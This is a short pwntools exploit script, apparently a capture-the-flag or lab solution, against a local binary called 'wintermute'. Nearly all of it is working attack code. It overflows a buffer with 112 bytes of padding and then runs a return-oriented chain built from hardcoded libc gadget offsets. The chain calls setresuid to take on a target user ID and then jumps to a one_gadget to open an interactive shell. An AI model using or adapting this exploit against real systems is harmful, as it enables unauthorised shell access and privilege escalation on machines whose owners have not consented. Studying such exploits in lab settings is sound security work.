from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

if (args.GDB):
	p = gdb.debug("./wintermute",
	'''
	b * main
	b * 0x0000000000401556
	r
	c
	''')
else:
	p = process("./wintermute")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
setuid = libc.symbols["setresuid"]
libc_base1 = 0x7ffff7c00000
pop_rdi = 0x10f78b
pop_rsi = 0x2b46b
pop_rdx = 0xb505c
print(hex(libc_base1+setuid))
pop_rbx = 0xa1e1e
one_gadgetaddr = 0x583ec

payload = [
	p64(libc_base1+pop_rdi),
	p64(1022),
	p64(libc_base1+pop_rsi),
	p64(1022),
	p64(1234),
	p64(libc_base1+pop_rdx),
	p64(1022),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(libc_base1+setuid),
	p64(libc_base1+pop_rbx),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x01),
	p64(libc_base1+0x2882f), #stack 16-byte alignment
	p64(libc_base1+one_gadgetaddr)
]

chain = b"".join(payload)

payload = b"A" * 112
payload += p64(0x7fffffffe200)
payload += chain
p.sendline(payload)
p.interactive()
